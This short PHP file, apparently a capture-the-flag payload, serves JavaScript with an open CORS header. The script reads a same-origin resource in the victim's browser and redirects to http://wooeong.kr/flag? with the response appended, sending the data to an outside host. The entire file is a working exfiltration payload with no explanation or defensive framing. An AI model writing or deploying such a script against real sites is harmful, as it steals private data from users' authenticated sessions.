<?php
header('Content-Type: application/javascript');
header('Access-Control-Allow-Origin: *');
?>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/d/41cb85ff5d4dd5e98b605c3f12ba61d1e5e690148cce08ccd8e83188fe7dbbd7', true);
xhr.onload = function () {
        location.href = "http://wooeong.kr/flag?".concat(escape(xhr.responseText));
};
xhr.send(null);